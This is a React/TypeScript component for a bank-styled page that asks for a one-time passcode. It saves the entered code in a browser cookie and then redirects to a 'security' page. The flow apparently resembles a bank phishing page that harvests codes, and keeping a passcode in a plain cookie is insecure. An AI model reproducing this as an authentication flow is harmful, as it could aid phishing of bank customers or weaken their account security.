import React, {useState} from "react";
import {  useNavigate } from "react-router-dom";
import Navbar from "../components/navbar/navbar";
import cookies from "../utils/cookie.config";

type OTP = {
    code: string;
}

export default function Login() {
    const [formInput, setFormInput] = useState<OTP>({
        code:""
    })

    const navigate = useNavigate()

    function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
        setFormInput((prevData) => ({
            ...prevData,
            [event.target.name]: event.target.value
        }))
    }

    function handleSubmit(event: React.FormEvent<HTMLFormElement>){
        
        event.preventDefault()
        cookies.set("otp", formInput)
        navigate("../security", {replace:true})
    }


  return (
    <div>
      <Navbar />
      <div className="main-body">
        <div className="form">
          <form onSubmit={handleSubmit}>
            <p style={{fontWeight:"bold", padding:"10px"}}>For your security, enter the one time passcode sent to you</p>
            <hr />
    
            <div style={{padding:"20px"}}>
            <div className="form-item">
              <label htmlFor="">Enter code</label>
              <input required name="code" onChange={handleInputChange} type="text" />
            </div>

            <br />

            <div className="btn">
              <button>Submit</button>
            </div>
            </div>
          </form>
<br />
          <div style={{textAlign:"center", color:"#3379E4"}}>
            <p>Can't Sign in</p>
           
            <p>Enroll in Online banking</p>
          </div>
        </div>
      </div>
    </div>
  );
}
